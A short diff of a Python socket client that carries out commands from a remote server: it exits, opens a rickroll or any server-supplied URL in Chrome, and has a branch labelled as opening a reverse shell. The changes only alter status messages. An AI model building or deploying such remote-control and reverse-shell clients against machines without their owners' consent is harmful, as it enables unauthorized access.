@@ -39,12 +39,13 @@ def socketStart():
                     if not data:
                         break
                     elif data == 'KILL':
-                        print("Connection closed by server.")
+                        print("Server sent KILL command. Exiting...")
                         exit(0)
                     elif data == 'ROLL':
                         open_chrome(rickroll_URL)
+                        print("Server sent rickroll.")
                     elif str(data).startswith("CHROME"):
-                        print("Opening Chrome tab...")
+                        print("Opening Chrome tab: " + data.split(' ')[1])
                         open_chrome(data.split(' ')[1])
                     elif data == 'RSHELL':
                         print("Opening Reverse Shell...")
